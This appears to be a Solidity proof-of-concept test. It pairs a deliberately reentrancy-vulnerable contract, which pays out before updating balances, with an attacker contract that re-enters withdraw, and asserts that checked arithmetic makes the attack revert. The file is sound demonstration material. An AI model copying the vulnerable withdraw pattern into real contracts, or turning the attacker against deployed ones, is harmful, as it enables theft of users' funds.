// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

interface Vm {
    function deal(address who, uint256 newBalance) external;
}

contract ReentrancyVictim {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "transfer failed");
        balances[msg.sender] -= amount;
    }
}

contract ReentrancyAttacker {
    ReentrancyVictim private immutable victim;
    uint256 private reentries;

    constructor(ReentrancyVictim target) {
        victim = target;
    }

    function fundAndDeposit() external payable {
        victim.deposit{value: msg.value}();
    }

    function attack() external {
        victim.withdraw(1 ether);
    }

    receive() external payable {
        if (reentries < 1) {
            reentries += 1;
            victim.withdraw(1 ether);
        }
    }
}

contract ReentrancyPoC {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function testPoC_ReentrancyBlockedByCheckedArithmetic() external {
        ReentrancyVictim victim = new ReentrancyVictim();
        ReentrancyAttacker attacker = new ReentrancyAttacker(victim);
        vm.deal(address(this), 1 ether);
        vm.deal(address(victim), 2 ether);
        attacker.fundAndDeposit{value: 1 ether}();
        uint256 beforeBalance = address(victim).balance;
        (bool success, ) = address(attacker).call(
            abi.encodeWithSignature("attack()")
        );
        require(!success, "reentrancy unexpectedly drained the victim");
        require(address(victim).balance == beforeBalance, "victim balance changed despite revert");
    }
}
